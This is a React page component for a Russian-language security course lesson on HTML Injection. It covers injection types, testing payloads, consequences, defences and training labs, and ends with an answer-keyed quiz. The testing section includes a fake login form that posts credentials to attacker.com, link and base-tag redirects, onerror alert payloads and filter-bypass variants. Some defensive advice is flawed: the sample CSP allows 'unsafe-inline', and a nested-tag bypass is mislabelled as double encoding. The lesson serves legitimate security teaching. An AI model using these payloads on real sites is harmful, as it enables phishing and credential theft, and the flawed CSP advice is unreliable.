'use client';

import React from 'react';
import { ContentPageLayout } from '@/components/content/ContentPageLayout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { ExternalLink } from 'lucide-react';
import { QuizItem } from '@/components/content/QuizItem';

const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
  <p className="mb-3 leading-relaxed" {...props}>{children}</p>
);

const H2: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h2 className="text-2xl font-bold mb-4 mt-6" {...props}>{children}</h2>
);

const H3: React.FC<React.HTMLAttributes<HTMLHeadingElement>> = ({ children, ...props }) => (
  <h3 className="text-xl font-semibold mb-3 mt-4" {...props}>{children}</h3>
);

export default function Lesson3Page() {
  const quizQuestions = [
    {
      question: "Что такое HTML Injection?",
      answers: [
        "Внедрение SQL-кода в базу данных",
        "Внедрение HTML-кода в веб-страницу через уязвимые входные данные",
        "Внедрение JavaScript-кода",
        "Внедрение CSS-стилей"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой тип HTML Injection происходит, когда данные сохраняются на сервере?",
      answers: [
        "Reflected HTML Injection",
        "Stored HTML Injection",
        "DOM-based HTML Injection",
        "Blind HTML Injection"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "В чем основное отличие HTML Injection от XSS?",
      answers: [
        "HTML Injection всегда более опасна",
        "HTML Injection не позволяет выполнять JavaScript код",
        "XSS не может изменять структуру страницы",
        "Нет никакой разницы"
      ],
      correctAnswerIndex: 1
    },
    {
      question: "Какой тип HTML Injection связан с манипуляцией DOM через JavaScript?",
      answers: [
        "Reflected HTML Injection",
        "Stored HTML Injection",
        "DOM-based HTML Injection",
        "Server-side HTML Injection"
      ],
      correctAnswerIndex: 2
    },
    {
      question: "Что может быть последствием успешной HTML Injection атаки?",
      answers: [
        "Только изменение внешнего вида страницы",
        "Фишинг, кража данных, изменение контента",
        "Удаление базы данных",
        "Отказ в обслуживании (DoS)"
      ],
      correctAnswerIndex: 1
    }
  ];

  return (
    <ContentPageLayout
      title="Урок 3: HTML Injection"
      subtitle="Изучение атак HTML Injection: типы, методы тестирования и защита"
    >
      <div className="space-y-6">
        <Card className="border-primary/20 bg-primary/5">
          <CardContent className="pt-6">
            <P className="text-sm">
              <strong>Источник материала:</strong> Данный урок основан на материалах из{' '}
              <a 
                href="https://innowise-group.atlassian.net/wiki/spaces/QD/pages/4037412233/HTML+Injection" 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-primary hover:underline inline-flex items-center"
              >
                Confluence (Innowise Group) <ExternalLink className="ml-1 h-3 w-3" />
              </a>
            </P>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Введение в HTML Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>HTML Injection</strong> — это уязвимость безопасности, которая возникает, когда злоумышленник может 
              внедрить произвольный HTML-код в веб-страницу через уязвимые входные данные. Это происходит из-за недостаточной 
              валидации или фильтрации пользовательского ввода на стороне сервера или клиента.
            </P>
            <P>
              Данный тип уязвимости, как и в случае <strong>XSS</strong>, один из наиболее часто встречающихся, 
              и её механика и логика очень схожа. Также, как и в случае ранее — это уязвимость с <strong>клиентской стороны</strong>, 
              то есть она может выполниться <strong>только в браузере</strong>.
            </P>
            <P>
              <strong>HTML injection</strong> — это атака, при которой злоумышленник внедряет определенные <strong>HTML-теги</strong> 
              и таким образом модифицирует контент страницы. Целью данной атаки является обман пользователей при помощи 
              социальной инженерии (например, каким-либо образом заставить пользователя ввести свои данные в форму логина 
              и пароля / перейти по ссылке, которой там не должно быть и т.д.)
            </P>
            <P>
              <strong>Важное отличие от XSS:</strong> В отличие от <strong>JavaScript Execution</strong>, 
              в данном виде атаки <strong>не используется JavaScript</strong> код. Проще говоря, 
              <strong> HTML injection влияет только на контент страницы</strong>.
            </P>
            <P>
              Однако важно отметить, что HTML Injection может быть ступенью к XSS-атаке, если фильтрация JavaScript 
              недостаточна или отсутствует.
            </P>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Типы HTML Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <H3>1. Reflected HTML Injection</H3>
              <P>
                <strong>Отраженная HTML-инъекция</strong> происходит, когда пользовательский ввод немедленно отражается обратно 
                на странице без должной санитизации.
              </P>
              <P><strong>Характеристики:</strong></P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Внедренный HTML-код выполняется немедленно в контексте текущей страницы</li>
                <li>Требует, чтобы жертва перешла по специально подготовленной ссылке</li>
                <li>Не сохраняется на сервере</li>
                <li>Часто используется в фишинговых атаках</li>
              </ul>
              <P><strong>Пример:</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`URL: https://example.com/search?q=<h1>Поддельное сообщение</h1>

Результат на странице:
<div>Результаты поиска для: <h1>Поддельное сообщение</h1></div>`}
                </pre>
              </div>
            </div>

            <div>
              <H3>2. Stored HTML Injection</H3>
              <P>
                <strong>Хранимая HTML-инъекция</strong> — наиболее опасный тип, где внедренный HTML-код сохраняется 
                на сервере (в базе данных, файле, кэше) и отображается всем пользователям, просматривающим зараженную страницу.
              </P>
              <P><strong>Характеристики:</strong></P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Payload сохраняется в приложении (например, в комментариях, профилях, форумах)</li>
                <li>Активируется каждый раз, когда пользователь загружает зараженную страницу</li>
                <li>Не требует взаимодействия со специально подготовленной ссылкой</li>
                <li>Может затронуть множество пользователей</li>
              </ul>
              <P><strong>Пример:</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`Комментарий пользователя:
<img src="fake.png" onerror="alert('Взломано')">

Каждый пользователь, просматривающий комментарии, увидит этот HTML.`}
                </pre>
              </div>
            </div>

            <div>
              <H3>3. DOM-based HTML Injection</H3>
              <P>
                <strong>DOM-based HTML Injection</strong> происходит на стороне клиента, когда JavaScript-код 
                манипулирует DOM (Document Object Model) с использованием непроверенных пользовательских данных.
              </P>
              <P><strong>Характеристики:</strong></P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Уязвимость находится в клиентском JavaScript-коде</li>
                <li>Сервер может не видеть вредоносный payload</li>
                <li>Использует небезопасные методы работы с DOM (например, <code className="bg-muted px-1 py-0.5 rounded">innerHTML</code>, <code className="bg-muted px-1 py-0.5 rounded">document.write</code>)</li>
                <li>Сложнее обнаружить стандартными инструментами сканирования</li>
              </ul>
              <P><strong>Пример уязвимого кода:</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`// Уязвимый код
let userInput = location.hash.substring(1);
document.getElementById("output").innerHTML = userInput;

// URL: https://example.com/#<h1>Внедренный заголовок</h1>
// Результат: заголовок будет отображен на странице`}
                </pre>
              </div>
            </div>

            <div>
              <H3>4. Blind HTML Injection</H3>
              <P>
                <strong>Слепая HTML-инъекция</strong> происходит, когда злоумышленник не видит результат своей атаки напрямую, 
                но может влиять на других пользователей или административные панели.
              </P>
              <P><strong>Характеристики:</strong></P>
              <ul className="list-disc pl-6 mb-3 space-y-1">
                <li>Внедренный код не отображается атакующему</li>
                <li>Часто используется в административных панелях или внутренних системах</li>
                <li>Требует знания структуры приложения</li>
                <li>Может использоваться для социальной инженерии администраторов</li>
              </ul>
              <P><strong>Пример:</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
                <pre className="text-sm">
{`Форма обратной связи:
Имя: <h1>Срочно!</h1>
Сообщение: <b>Требуется немедленное внимание</b>

Администратор видит в панели подделанное сообщение с форматированием.`}
                </pre>
              </div>
              
              <P><strong>Практический пример Blind HTML Injection:</strong></P>
              <div className="bg-muted p-4 rounded-md mb-3">
                <P className="text-sm mb-2">1. Отправляем запрос с внедренной ссылкой:</P>
                <div className="border-2 border-dashed border-primary/30 rounded p-4 text-center bg-background">
                  <img 
                    src="/pics/html-injection-lesson/blind-html-injection-request.png" 
                    alt="Запрос с HTML инъекцией в параметрах"
                    className="max-w-full h-auto mx-auto rounded shadow-md"
                  />
                  <P className="text-xs text-muted-foreground mt-2">
                    Скриншот: Запрос с внедренными HTML тегами в параметрах
                  </P>
                </div>
              </div>
              
              <div className="bg-muted p-4 rounded-md mb-3">
                <P className="text-sm mb-2">2. Получатель видит результат в письме:</P>
                <div className="border-2 border-dashed border-primary/30 rounded p-4 text-center bg-background">
                  <img 
                    src="/pics/html-injection-lesson/blind-html-injection-email-result.png" 
                    alt="Email с отображением внедренного HTML"
                    className="max-w-full h-auto mx-auto rounded shadow-md"
                  />
                  <P className="text-xs text-muted-foreground mt-2">
                    Скриншот: Письмо с отформатированным контентом от внедренного HTML
                  </P>
                </div>
              </div>
              
              <P className="mt-3">
                <strong>Возможный сценарий атаки:</strong> HTML инъекция может быть в нескольких параметрах одновременно 
                (например, в полях "Name" и "Message"). Вместо простого текста "Test" и "User_Name" 
                злоумышленник может вставить: <em>"Dear user! We have detected suspicious activity! 
                Please change your password... Link Here."</em> с поддельной ссылкой на фишинговый сайт.
              </P>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Методы тестирования HTML Injection</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P><strong>Общий подход к выявлению HTML инъекций:</strong></P>
            <ol className="list-decimal pl-6 mb-4 space-y-2">
              <li>Собираем и мапим наше целевое приложение, определяем все точки входа (GET/POST параметры)</li>
              <li>Тестируем каждую точку входа различными HTML-тегами</li>
              <li>Анализируем ответы и поведение приложения</li>
              <li>Проверяем возможность обхода фильтров</li>
            </ol>

            <div className="bg-amber-50 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800 rounded-md p-4 mb-4">
              <P className="text-sm">
                <strong>⚠️ Важное замечание о бизнес-логике:</strong> Самый простой способ — добавлять теги 
                <code className="bg-muted px-1 py-0.5 rounded mx-1">&lt;h1&gt;Some_test&lt;/h1&gt;</code>, 
                <code className="bg-muted px-1 py-0.5 rounded mx-1">&lt;b&gt;Bold_Text&lt;/b&gt;</code> и др. 
                Но если в этом есть необходимость логики, как например на <strong>Confluence</strong> 
                (где есть редактор с поддержкой форматирования), то это бизнес-идея приложения. 
                Главное, чтобы она не позволяла нам, например, с помощью этого редактора изменить страницу, 
                которую мы не можем редактировать (например, при помощи <strong>Broken Access Control</strong>).
              </P>
            </div>

            <H3>1. Базовые HTML-теги</H3>
            <P>Начните с простых HTML-тегов для проверки фильтрации:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<h1>Test</h1>
<b>Bold text</b>
<i>Italic text</i>
<u>Underlined text</u>
<marquee>Moving text</marquee>`}
              </pre>
            </div>

            <H3>2. Тестирование с изображениями</H3>
            <P>Проверьте возможность внедрения тега изображения:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<img src="nonexistent.jpg">
<img src=x onerror="alert(1)">
<button>Click here!</button>`}
              </pre>
            </div>

            <H3>3. Манипуляция формами</H3>
            <P>Попробуйте внедрить поддельные формы для фишинга:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<form action="http://attacker.com/steal.php" method="POST">
  <input type="text" name="username" placeholder="Имя пользователя">
  <input type="password" name="password" placeholder="Пароль">
  <input type="submit" value="Войти">
</form>`}
              </pre>
            </div>

            <H3>4. Изменение ссылок</H3>
            <P>Тестируйте возможность подмены ссылок:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<a href="http://attacker.com/phishing">Нажмите здесь</a>
<base href="http://attacker.com/">`}
              </pre>
            </div>

            <H3>5. Комментарии для DoS</H3>
            <P>Отправить тег открытия комментария, что может полностью остановить работу страницы:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<!--
(все последующее содержимое будет восприниматься как комментарий)`}
              </pre>
            </div>

            <H3>6. DOM-based тестирование</H3>
            <P>Для DOM-based HTML Injection проверьте параметры, обрабатываемые JavaScript:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`// В URL или hash
https://example.com/#<h1>Test</h1>
https://example.com/?param=<img src=x>

// Проверьте источники данных:
- location.hash
- location.search
- document.referrer
- postMessage events`}
              </pre>
            </div>

            <H3>7. Обход фильтров</H3>
            <P>Если базовые теги блокируются, попробуйте обход:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`<H1>Test</H1>           (регистр)
<h1 style="color:red">Test</h1>  (атрибуты)
<h1 id="test">Test</h1>
<h1 class="header">Test</h1>
<sCrIpT>alert(1)</sCrIpT>  (смешанный регистр)
<scr<script>ipt>alert(1)</script>  (двойное кодирование)`}
              </pre>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Потенциальные последствия</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P><strong>HTML Injection может привести к следующим последствиям:</strong></P>
            <ul className="list-disc pl-6 mb-3 space-y-2">
              <li>
                <strong>Дефейс (изменение внешнего вида)</strong>: Изменение содержимого страницы для демонстрации 
                политических сообщений, нанесения ущерба репутации или развлечения
              </li>
              <li>
                <strong>Фишинг</strong>: Внедрение поддельных форм входа для кражи учетных данных пользователей
              </li>
              <li>
                <strong>Подмена контента</strong>: Изменение легитимной информации на странице (цены, новости, инструкции)
              </li>
              <li>
                <strong>Социальная инженерия</strong>: Отображение ложных предупреждений или сообщений для манипуляции пользователями
              </li>
              <li>
                <strong>Перенаправление на вредоносные сайты</strong>: Изменение ссылок на странице
              </li>
              <li>
                <strong>Кража информации</strong>: При использовании атрибутов вроде <code className="bg-muted px-1 py-0.5 rounded">onerror</code> 
                или если фильтрация JavaScript недостаточна
              </li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Методы защиты</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <H3>1. Валидация входных данных</H3>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Используйте whitelist подход: разрешайте только ожидаемые символы</li>
              <li>Ограничьте длину входных данных</li>
              <li>Проверяйте типы данных (email, URL, номера телефонов)</li>
            </ul>

            <H3>2. Кодирование выходных данных</H3>
            <P>Всегда кодируйте данные перед выводом:</P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li><strong>HTML Entity Encoding</strong>: Преобразуйте специальные символы (<code className="bg-muted px-1 py-0.5 rounded">&lt;</code>, <code className="bg-muted px-1 py-0.5 rounded">&gt;</code>, <code className="bg-muted px-1 py-0.5 rounded">&amp;</code>, <code className="bg-muted px-1 py-0.5 rounded">&quot;</code>, <code className="bg-muted px-1 py-0.5 rounded">&#x27;</code>) в HTML entities</li>
              <li><strong>JavaScript Encoding</strong>: Для данных в JavaScript контексте</li>
              <li><strong>URL Encoding</strong>: Для данных в URL</li>
            </ul>

            <H3>3. Content Security Policy (CSP)</H3>
            <P>Используйте CSP заголовки для ограничения источников контента:</P>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'`}
              </pre>
            </div>

            <H3>4. Использование безопасных методов DOM</H3>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Используйте <code className="bg-muted px-1 py-0.5 rounded">textContent</code> вместо <code className="bg-muted px-1 py-0.5 rounded">innerHTML</code></li>
              <li>Избегайте <code className="bg-muted px-1 py-0.5 rounded">document.write()</code></li>
              <li>Используйте <code className="bg-muted px-1 py-0.5 rounded">createElement()</code> и <code className="bg-muted px-1 py-0.5 rounded">createTextNode()</code></li>
            </ul>

            <H3>5. Санитизация HTML</H3>
            <P>Если необходимо разрешить некоторый HTML:</P>
            <ul className="list-disc pl-6 mb-3 space-y-1">
              <li>Используйте проверенные библиотеки (DOMPurify, HTML Purifier)</li>
              <li>Настройте whitelist разрешенных тегов и атрибутов</li>
              <li>Регулярно обновляйте библиотеки санитизации</li>
            </ul>

            <H3>6. HTTP-заголовки безопасности</H3>
            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
              <pre className="text-sm">
{`X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block`}
              </pre>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Инструменты для тестирования</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Burp Suite</strong>: Для перехвата и модификации запросов</li>
              <li><strong>OWASP ZAP</strong>: Автоматическое сканирование и тестирование</li>
              <li><strong>Browser Developer Tools</strong>: Для анализа DOM и JavaScript</li>
              <li><strong>XSS Hunter</strong>: Для обнаружения Blind HTML Injection</li>
              <li><strong>Custom Scripts</strong>: Автоматизация с помощью Python, JavaScript</li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Практические примеры и лаборатории</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              Для практики HTML Injection рекомендуется использовать легальные учебные платформы:
            </P>
            <ul className="list-disc pl-6 space-y-2">
              <li>
                <strong>PortSwigger Web Security Academy</strong>
                <a 
                  href="https://portswigger.net/web-security/cross-site-scripting" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="inline-flex items-center ml-2 text-primary hover:underline"
                >
                  Перейти <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
              <li><strong>DVWA (Damn Vulnerable Web Application)</strong></li>
              <li><strong>bWAPP (Buggy Web Application)</strong> - требует локальной установки в VirtualBox</li>
              <li><strong>WebGoat</strong></li>
              <li><strong>OWASP Juice Shop</strong></li>
              <li>
                <strong>TryHackMe - HTML Injection Room</strong>
                <a 
                  href="https://discover.hubpages.com/technology/HTML-Injection-TryHackMe-OWASPBWA" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="inline-flex items-center ml-2 text-primary hover:underline"
                >
                  Гайд <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
            </ul>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Домашнее задание</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <P>
              <strong>Практические задачи:</strong> Есть на платформе <strong>bWAPP</strong>, но ее нужно 
              устанавливать локально в <strong>VirtualBox</strong>. Выполнение по желанию. 
              Также есть <strong>room</strong> на <strong>TryHackMe</strong>, но там одно задание.
            </P>
            
            <P><strong>Обязательное чтение:</strong></P>
            <ol className="list-decimal pl-6 space-y-2">
              <li>
                <a 
                  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary hover:underline inline-flex items-center"
                >
                  OWASP Testing Guide - HTML Injection <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
              <li>
                <a 
                  href="https://infosecwriteups.com/html-injection-to-mass-phishing-5701d495cdc2" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary hover:underline inline-flex items-center"
                >
                  HTML Injection to Mass Phishing <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
              <li>
                <a 
                  href="https://www.youtube.com/watch?v=VLk5QGZUUs0" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary hover:underline inline-flex items-center"
                >
                  Видео: HTML Injection Tutorial <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
              <li>
                <a 
                  href="https://discover.hubpages.com/technology/HTML-Injection-TryHackMe-OWASPBWA" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary hover:underline inline-flex items-center"
                >
                  HTML Injection TryHackMe Guide <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
              <li>
                <a 
                  href="https://www.invicti.com/learn/html-injection/" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-primary hover:underline inline-flex items-center"
                >
                  Invicti - Learn About HTML Injection <ExternalLink className="ml-1 h-4 w-4" />
                </a>
              </li>
            </ol>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Проверка знаний</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-6">
              {quizQuestions.map((q, index) => (
                <QuizItem
                  key={index}
                  question={q.question}
                  answers={q.answers}
                  correctAnswerIndex={q.correctAnswerIndex}
                />
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="bg-primary/5 border-primary/20">
          <CardHeader>
            <CardTitle>Заключение</CardTitle>
          </CardHeader>
          <CardContent>
            <P>
              HTML Injection — серьезная уязвимость, которая может быть использована для различных атак, 
              от простого дефейса до сложных фишинговых кампаний. Понимание различных типов HTML Injection, 
              методов тестирования и защиты критически важно для разработчиков и специалистов по безопасности.
            </P>
            <P>
              Всегда помните: <strong>никогда не доверяйте пользовательскому вводу</strong> и применяйте 
              принцип глубокой защиты (defense in depth), используя множественные уровни защиты.
            </P>
          </CardContent>
        </Card>
      </div>
    </ContentPageLayout>
  );
}
